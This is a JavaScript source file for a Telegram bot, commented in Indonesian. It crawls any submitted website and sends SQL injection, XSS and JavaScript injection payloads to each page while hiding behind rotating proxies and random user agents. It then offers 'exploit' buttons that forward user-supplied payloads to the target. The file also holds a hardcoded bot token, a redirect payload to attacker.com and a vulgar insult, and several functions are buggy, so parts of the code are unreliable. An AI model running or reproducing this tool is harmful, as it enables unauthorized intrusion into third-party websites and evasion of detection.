const { Telegraf } = require('telegraf');
const fetch = require('node-fetch');
const cheerio = require('cheerio');
const robotsParser = require('robots-parser');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const Queue = require('promise-queue');
const fs = require('fs');
const chalk = require('chalk');

const BOT_TOKEN = '8026913478:AAG7CS_R5AnkFHjzs5b-dy_o20J9Ud_gG4Q';
const bot = new Telegraf(BOT_TOKEN);
const proxyFilePath = 'proxies.txt';
const PROXY_TEST_TIMEOUT = 5000;
const MAX_CONCURRENT_PROXY_TESTS = 10;
const PROXY_TEST_URLS = [
    'https://www.google.com',
    'https://www.example.com',
    'https://www.bing.com'
];
const MAX_RETRIES = 3;
const MAX_LINKS_PER_PAGE = 20; // Membatasi jumlah tautan per halaman
const MAX_CRAWL_DEPTH = 3; // Membatasi kedalaman perayapan

let proxies = [];

const VulnerabilityLevel = {
    NOT_VULNERABLE: 'Tidak Rentan',
    POSSIBLY_VULNERABLE: 'Mungkin Rentan',
    VERY_VULNERABLE: 'Sangat Rentan'
};

// Function to encode HTML to base64
function encodeHTMLToBase64(html) {
    const buffer = Buffer.from(html, 'utf-8');
    return buffer.toString('base64');
}

// Function to log the injection attempt
function logInjectionAttempt(method, targetUrl, detected, status) {
    console.log(`Log uji coba suntik ${method}:\nTarget: ${targetUrl}\nKerentanan: ${detected ? 'Terdeteksi' : 'Tidak'}\nStatus: status`);
}

// Create a queue with a maximum of 1 concurrent operation
const queue = new Queue(1, Infinity);

// Function to send messages with rate limiting
async function sendMessage(ctx, message) {
    try {
        await ctx.reply(message);
    } catch (error) {
        console.error('Error sending message:', error);
    }
}

const scanResults = new Map();

function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function loadProxiesFromFile() {
    console.log(chalk.yellow('Mengambil proxy...'));
    try {
        const data = fs.readFileSync(proxyFilePath, 'utf8');
        const proxyList = data.split('\n').map(p => p.trim()).filter(p => p);
        console.log(`Memuat ${proxyList.length} proxy dari file.`);

        const testedProxies = await Promise.all(
            proxyList.map(async proxy => {
                if (await testProxy(proxy)) {
                    console.log(chalk.green(`Proxy ${proxy} berfungsi.`));
                    return proxy;
                } else {
                    console.log(chalk.red(`Proxy ${proxy} tidak berfungsi dan dilewati.`));
                    return null;
                }
            })
        );

        proxies = testedProxies.filter(p => p);
        console.log(`Total proxy hidup: ${proxies.length}`);
    } catch (error) {
        console.error(chalk.red(`Gagal memuat proxy dari file: ${error.message}`));
    }
}

async function testProxy(proxy, retryCount = 2) {
    for (let i = 0; i < retryCount; i++) {
        try {
            const testUrl = PROXY_TEST_URLS[i % PROXY_TEST_URLS.length];
            const options = {
                timeout: PROXY_TEST_TIMEOUT,
            };

            if (proxy.startsWith('http')) options.agent = new HttpsProxyAgent(proxy);
            else if (proxy.startsWith('socks')) options.agent = new SocksProxyAgent(proxy);

            const res = await fetch(testUrl, options);
            if (res.ok) {
                return true;
            } else {
                console.log(chalk.yellow(`Proxy ${proxy} gagal dengan status ${res.status}, mencoba lagi...`));
            }
        } catch (error) {
            console.log(chalk.yellow(`Proxy ${proxy} gagal: ${error.message}, mencoba lagi...`));
        }
    }
    return false;
}

function getRandomProxy() {
    if (!proxies.length) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function getRandomUserAgent() {
    const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}

async function makeRequestWithRetry(url, options = {}, retryCount = MAX_RETRIES) {
    let lastError = null;
    for (let i = 0; i < retryCount; i++) {
        try {
            const userAgent = getRandomUserAgent();
            const proxy = getRandomProxy();

            const updatedOptions = { ...options };
            updatedOptions.headers = { 'User-Agent': userAgent, ...updatedOptions.headers };
            updatedOptions.timeout = updatedOptions.timeout || 10000;
            updatedOptions.redirect = 'follow';

            if (proxy) {
                try {
                    if (proxy.startsWith('http')) updatedOptions.agent = new HttpsProxyAgent(proxy);
                    else if (proxy.startsWith('socks')) updatedOptions.agent = new SocksProxyAgent(proxy);
                } catch (error) {
                    console.error(`Failed to create agent for proxy ${proxy}: ${error.message}`);
                    lastError = error;
                    continue;
                }
            }

            const res = await fetch(url, updatedOptions);
            if (!res.ok) {
                console.error(`Request to ${url} failed: ${res.status} ${res.statusText}`);
                lastError = new Error(`Request failed with status ${res.status}`);
                continue;
            }
            const text = await res.text();
            return { text, status: res.status, headers: res.headers };
        } catch (error) {
            console.error(`Error fetching ${url}: ${error.message}`);
            lastError = error;
        }
    }
    console.error(`Failed to fetch ${url} after ${retryCount} retries: ${lastError.message}`);
    return { text: '', status: -1, headers: null };
}

async function getLinksFromPage(url, baseUrl) {
    try {
        const { text, status } = await makeRequestWithRetry(url);
        if (status < 200 || status >= 300) {
            return [];
        }

        const $ = cheerio.load(text);
        const links = [];
        $('a[href]').each((i, el) => {
            let href = $(el).attr('href');
            if (!href) return;
            try {
                if (href.startsWith('/')) href = new URL(href, baseUrl).href;
                else if (!href.startsWith('http')) href = new URL(href, url).href;
                if (href.startsWith('http')) links.push(href);
            } catch (error) {
                console.error(`Error parsing URL ${href}: ${error.message}`);
            }
        });
        return links;
    } catch (error) {
        console.error(`Error getting links from ${url}: ${error.message}`);
        return [];
    }
}

async function isAllowedByRobots(url) {
    try {
        const base = new URL(url).origin;
        const { text, status } = await makeRequestWithRetry(base + '/robots.txt');
        if (status < 200 || status >= 300) return true;
        const robots = robotsParser(base + '/robots.txt', text);
        return robots.isAllowed(url, '*');
    } catch (error) {
        console.error(`Error checking robots.txt for ${url}: ${error.message}`);
        return true;
    }
}
// Function to detect the CMS used by a website
async function detectCMS(url) {
    try {
        const { text } = await makeRequestWithRetry(url);

        if (text.includes('wp-content')) {
            return 'WordPress';
        } else if (text.includes('Joomla')) {
            return 'Joomla';
        } else if (text.includes('Drupal')) {
            return 'Drupal';
        } else {
            return 'Unknown';
        }
    } catch (error) {
        console.error(`Error detecting CMS for ${url}: ${error.message}`);
        return 'Unknown';
    }
}

// --- SQL INJECTION TESTING ---
async function testSQLInjection(url) {
    let isVulnerable = false;
    let injectionStatus = 'Gagal';
    let dbType = 'Unknown';
    let testResult = {};
    let errorMessage = null;

    const dbTypePayloads = [
        { type: 'MySQL', payload: "'+AND+@@version>0--", success: 'MySQL' },
        { type: 'PostgreSQL', payload: "';SELECT+version()--", success: 'PostgreSQL' },
        { type: 'MSSQL', payload: "';SELECT+@@version--", success: 'SQL Server' }
    ];

    try {
        for (const payloadObj of dbTypePayloads) {
            const modifiedUrl = url + payloadObj.payload;
            try {
                const { text } = await makeRequestWithRetry(modifiedUrl);
                if (text && text.includes(payloadObj.success)) {
                    dbType = payloadObj.type;
                    console.log(`Database type detected: ${dbType}`);
                    break;
                }
            } catch (error) {
                console.error(`Database type detection failed for ${payloadObj.type}: ${error.message}`);
                errorMessage = `Database type detection failed for ${payloadObj.type}: ${error.message}`;
            }
        }

        const payloads = [
            { type: 'Error-Based', payload: "'", success: 'error in your SQL syntax' },
            { type: 'Error-Based', payload: '"', success: 'error in your SQL syntax' },
            { type: 'Error-Based', payload: "'+OR+1=1--", success: 'result' },
            { type: 'Error-Based', payload: '"+OR+1=1--', success: 'result' },
            { type: 'ORDER BY', payload: ' ORDER BY 1--', success: 'valid' },
            { type: 'ORDER BY', payload: ' ORDER BY 99--', success: 'invalid column' },
            { type: 'UNION SELECT', payload: " UNION SELECT null,null,null--", success: 'valid union' },
            { type: 'Extract Data', payload: "'+UNION+SELECT+NULL,user(),database()--", success: 'result' },
            { type: 'Time-Based Blind SQL', payload: "' AND SLEEP(5)='", success: 'result (delayed)' }
        ];

        for (const payloadObj of payloads) {
            const modifiedUrl = url + payloadObj.payload;
            try {
                const { text, status } = await makeRequestWithRetry(modifiedUrl);
                console.log(`SQL Injection Test - URL: ${modifiedUrl}, Status: ${status}`);
                if (text && text.toLowerCase().includes(payloadObj.success.toLowerCase())) {
                    isVulnerable = true;
                    injectionStatus = 'Berhasil';
                    console.warn(`SQL Injection found and exploited at ${modifiedUrl}`);
                    testResult = {
                        vulnerability: 'SQL Injection',
                        type: payloadObj.type,
                        payload: payloadObj.payload
                    };
                    break;
                }
            } catch (error) {
                console.error(`SQL Injection test failed with payload ${payloadObj.payload}: ${error.message}`);
                errorMessage = `SQL Injection test failed with payload ${payloadObj.payload}: ${error.message}`;
            }
        }
    } catch (error) {
        console.error(`SQL Injection test failed: ${error.message}`);
        injectionStatus = 'Gagal';
        errorMessage = `SQL Injection test failed: ${error.message}`;
    }

    logInjectionAttempt('SQL', url, injectionStatus);

    let returnObject = testResult.vulnerability ? testResult : {
        vulnerability: 'Tidak Rentan SQL Injection',
        type: null,
        payload: null
    };

    if (errorMessage) {
        returnObject.error = errorMessage;
    }

    return returnObject;
}

// --- XSS TESTING ---
async function testXSS(url, htmlPayload) {
    let isVulnerable = false;
    let injectionStatus = 'Gagal';
    const xssPayloads = [
        `\'><BODY onload!#$%&()*~+-_.,:;?@[\/|\\]^\`=alert('XSS')>\'>`,
        `\'><marquee><h1>XSS</h1></marquee>`,
        `<img src="x" onerror="alert('XSS')">`,
        `<script>alert('XSS')</script>`,
        `<a href="javascript:void(0)" onclick="alert('XSS')">Click Me</a>`
    ];

    if (!htmlPayload) {
        logInjectionAttempt('XSS', url, injectionStatus);
        return { vulnerability: VulnerabilityLevel.NOT_VULNERABLE, payload: null };
    }

    const payloadsToTest = [htmlPayload, ...xssPayloads];

    try {
    for (const payload of payloadsToTest) {
        const dataUriPayload = payload;
        try {
            const { text, status } = await makeRequestWithRetry(url + encodeURIComponent(dataUriPayload));
              console.log(`XSS Test - URL: ${url + encodeURIComponent(dataUriPayload)}, Status: ${status}`); // Tambahan
            if (text && text.includes(dataUriPayload)) {
                if (text.includes("<script>alert('XSS')</script>")) {
                    isVulnerable = true;
                    injectionStatus = 'Berhasil';
                    console.warn(`XSS found and exploited at ${url}`);
                    break;
                }
                if (text.includes("document.documentElement.innerHTML")) {
                    console.warn("Full page replacement successful!");
                    break;
                }
            }
        } catch (error) {
            console.error(`XSS test failed with payload ${dataUriPayload}: ${error.message}`);
        }
    }
    } catch (error) {
        console.error(`XSS test failed: ${error.message}`);
        injectionStatus = 'Gagal';
    }

    logInjectionAttempt('XSS', url, injectionStatus);

    return {
        vulnerability: isVulnerable ? VulnerabilityLevel.VERY_VULNERABLE : VulnerabilityLevel.NOT_VULNERABLE,
        payload: isVulnerable ? dataUriPayload : null
    };
}

// --- JAVASCRIPT INJECTION TESTING ---
async function testJavaScriptInjection(url) {
    let isVulnerable = false;
    let injectionStatus = 'Gagal';

    const jsPayloads = [
        `<script>alert('XSS')</script>`,
        `document.body.innerHTML = '<h1>Injected!</h1>'`,
        `window.location.href = 'http://attacker.com'`
    ];
    try {
    for (const jsPayload of jsPayloads) {
        try {
            const { text, status } = await makeRequestWithRetry(url, { method: 'POST', body: `injection=${jsPayload}` });
              console.log(`JavaScript Injection Test - URL: ${url}, Payload: ${jsPayload}, Status: ${status}`); // Tambahan
            if (text && text.includes(jsPayload)) {
                isVulnerable = true;
                injectionStatus = 'Berhasil';

                if (jsPayload.includes("alert('XSS')") && text.includes("alert('XSS')")) {
                    console.warn(`JavaScript Injection found and exploited at ${url}`);
                }

                if (jsPayload.includes("window.location.href")) {
                    console.warn(`Redirection payload successful: ${jsPayload}`);
                }
                if (jsPayload.includes("document.documentElement.innerHTML")) {
                    console.warn(`Full page replacement successful!`);
                }
            }
        } catch (error) {
            console.error(`JavaScript Injection test failed: ${error.message}`);
        }
    }
    }  catch (error) {
         console.error(`JavaScript Injection test failed: ${error.message}`);
          injectionStatus = 'Gagal';
    }
    logInjectionAttempt('JavaScript', url, injectionStatus);

    return {
        vulnerability: isVulnerable ? VulnerabilityLevel.VERY_VULNERABLE : VulnerabilityLevel.NOT_VULNERABLE,
        payload: isVulnerable ? jsPayload : null
    };
}

// --- CRAWL AND SCAN ---
async function crawlAndScan(baseUrl, chatId, ctx, depth = MAX_CRAWL_DEPTH, visited = new Set()) {
     try {
        if (depth <= 0 || visited.has(baseUrl)) {
            console.log(`Sudah dikunjungi atau kedalaman maksimum tercapai: ${baseUrl}`);
            return;
        }

        const normalizedBaseUrl = baseUrl.split('#')[0];
        if (visited.has(normalizedBaseUrl)) {
            console.log(`Sudah dikunjungi (setelah normalisasi): ${normalizedBaseUrl}`);
            return;
        }

        visited.add(normalizedBaseUrl);

        console.log(`Merayapi dan memindai: ${baseUrl}`);

        // Technology Detection (Example)
        const { headers } = await makeRequestWithRetry(baseUrl, { method: 'HEAD' });
        if (headers && headers.get('server')) {
            const server = headers.get('server');
            console.log(`Server technology detected: ${server}`);
        }

        // Detect CMS
        const cms = await detectCMS(baseUrl);
        console.log(`CMS detected: ${cms}`);

        const xssResult = await testXSS(baseUrl, "");
        const jsResult = await testJavaScriptInjection(baseUrl);
        const sqlResult = await testSQLInjection(baseUrl);

        console.log(`xssResult: ${xssResult.vulnerability}`);
        console.log(`jsResult: ${jsResult.vulnerability}`);
        console.log(`sqlResult: ${sqlResult.vulnerability}`);

        const keyboard = [];
        if (sqlResult.vulnerability === 'SQL Injection') {
            keyboard.push([{ text: 'Eksploitasi SQL', callback_data: `exploit_sql_${chatId}` }]);
        }

        if (xssResult.vulnerability === VulnerabilityLevel.VERY_VULNERABLE) {
            keyboard.push([{ text: 'Eksploitasi XSS', callback_data: `exploit_xss_${chatId}` }]);
        }

        if (jsResult.vulnerability === VulnerabilityLevel.VERY_VULNERABLE) {
            keyboard.push([{ text: 'Eksploitasi JS', callback_data: `exploit_js_${chatId}` }]);
        }
         scanResults.set(chatId, { url: baseUrl, xss: xssResult, js: jsResult, sql: sqlResult });
         const replyMarkup = keyboard.length > 0 ? { inline_keyboard: keyboard } : null;
            if (replyMarkup) {
                 try {  // Perbaikan: Tambahkan try-catch di sekitar panggilan sendMessage
                      await ctx.reply(`Kerentanan ditemukan di: ${baseUrl}. Pilih eksploitasi:`, { reply_markup: replyMarkup });
                 } catch (telegramError) {
                      console.error(`Gagal mengirim pesan Telegram: ${telegramError.message}`);
                 }
            }

         const links = await getLinksFromPage(baseUrl, baseUrl);
          for (const link of links) {
               if (link.startsWith(new URL(baseUrl).origin)) {
                    try {  // Tambahkan error handling di sini
                         await crawlAndScan(link, chatId, ctx, depth - 1, visited);
                    } catch (error) {
                         console.error(`Error saat merayapi ${link}: ${error.message}`);
                    }
               }
          }

    } catch (error) {
        console.error(`Error scanning ${baseUrl}: ${error.message}`);
    }
}

// --- BOT LOGIC ---
bot.start((ctx) => {
    const photoUrl = 'https://files.catbox.moe/5qc6vw.jpg';
    const message = 'Ketik /test  untuk memulai scan dan me ekspor payload (kilua kontol).';

    ctx.replyWithPhoto(photoUrl, {
        caption: message
    });
});
bot.command('test', async (ctx) => {
    const parts = ctx.message.text.split(' ');
    if (parts.length > 1) {
        const targetUrl = parts[1];
        await sendMessage(ctx,`Memulai scan pada ${targetUrl}...`);
        crawlAndScan(targetUrl, ctx.chat.id, ctx);
    } else {
        return sendMessage(ctx,'Tidak ada URL yang diberikan untuk diuji.');
    }
});

bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    const chatId = ctx.chat.id;
        const scanData = scanResults.get(chatId);

        if (!scanData) {
            return ctx.answerCbQuery('Data scan tidak ditemukan.');
        }
    if (data.startsWith('exploit_')) {
          const vulnerabilityType = data.split('_')[1];
          ctx.answerCbQuery(`Memilih untuk mengeksploitasi ${vulnerabilityType}...`);

          bot.once('text', async (ctx) => {
               const payload = ctx.message.text;
               let resultMessage = `Eksploitasi ${vulnerabilityType} dengan payload: ${payload}\n`;

               try {
                    let exploitResult = null;
                    switch (vulnerabilityType) {
                         case 'sql':
                              exploitResult = await testSQLExploit(scanData.url, payload);
                              break;
                         case 'xss':
                              exploitResult = await testXSSExploit(scanData.url, payload);
                              break;
                         case 'js':
                              exploitResult = await testJSExploit(scanData.url, payload);
                              break;
                         default:
                              resultMessage += 'Jenis eksploitasi tidak valid.';
                    }

                    if (exploitResult) {
                         resultMessage += `Status: ${exploitResult.injectionStatus}\n`;
                         if (exploitResult.details) {
                              resultMessage += `Details: ${exploitResult.details}`;
                         }
                    } else {
                         resultMessage += 'Eksploitasi gagal.';
                    }
               } catch (exploitError) {
                    console.error(`Error selama eksploitasi: ${exploitError}`);
                    resultMessage = `Eksploitasi gagal: ${exploitError.message}`;
               }

               ctx.reply(resultMessage);
          });
        await ctx.reply('Masukkan payload untuk dieksploitasi:');
    }
});

// --- Function to test SQL Injection exploitation ---
async function testSQLExploit(url, payload) {
    try {
        const modifiedUrl = url + encodeURIComponent(payload);
        const { text, status } = await makeRequestWithRetry(modifiedUrl);

        console.log(`SQL Injection Exploit Test - URL: ${modifiedUrl}, Status: ${status}`);

        if (text && text.includes('informasi_yang_diharapkan')) {
            console.warn(`SQL Injection berhasil dieksploitasi dengan payload: ${payload}`);
            return { injectionStatus: 'Berhasil', details: 'Data sensitif berhasil diakses.' };
        } else {
            console.log(`SQL Injection tidak berhasil dengan payload: ${payload}`);
            return { injectionStatus: 'Gagal', details: 'Tidak dapat mengekstrak informasi yang diharapkan.' };
        }
    } catch (error) {
        console.error(`SQL Injection exploitation failed: ${error.message}`);
        return { injectionStatus: 'Gagal', details: `Error: ${error.message}` };
    }
}

// --- Function to test XSS exploitation ---
async function testXSSExploit(url, payload) {
    try {
        const modifiedUrl = url + encodeURIComponent(payload);
        const { text, status } = await makeRequestWithRetry(modifiedUrl);

        console.log(`XSS Exploit Test - URL: ${modifiedUrl}, Status: ${status}`);

        if (text && text.includes(payload)) {
            console.warn(`XSS berhasil dieksploitasi dengan payload: ${payload}`);
            return { injectionStatus: 'Berhasil', details: 'Kode JavaScript berhasil disuntikkan.' };
        } else {
            console.log(`XSS tidak berhasil dengan payload: ${payload}`);
            return { injectionStatus: 'Gagal', details: 'Kode JavaScript tidak dieksekusi.' };
        }
    } catch (error) {
        console.error(`XSS exploitation failed: ${error.message}`);
        return { injectionStatus: 'Gagal', details: `Error: ${error.message}` };
    }
}

// --- Function to test JavaScript Injection exploitation ---
async function testJSExploit(url, payload) {
    try {
        const options = {
            method: 'POST',
            body: `injection=${payload}`,
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        };
        const { text, status } = await makeRequestWithRetry(url, options);

        console.log(`JavaScript Exploit Test - URL: ${url}, Payload: ${payload}, Status: ${status}`);

        if (text && text.includes(payload)) {
            console.warn(`JavaScript berhasil dieksekusi dengan payload: ${payload}`);
            return { injectionStatus: 'Berhasil', details: 'Kode JavaScript berhasil disuntikkan dan dieksekusi.' };
        } else {
            console.log(`JavaScript tidak berhasil dengan payload: ${payload}`);
            return { injectionStatus: 'Gagal', details: 'Kode JavaScript tidak dieksekusi.' };
        }
    } catch (error) {
        console.error(`JavaScript exploitation failed: ${error.message}`);
        return { injectionStatus: 'Gagal', details: `Error: ${error.message}` };
    }
}

bot.launch();
(async () => { await loadProxiesFromFile(); console.log('Bot berjalan dengan proxy dari file & kustomisasi payload.'); })();
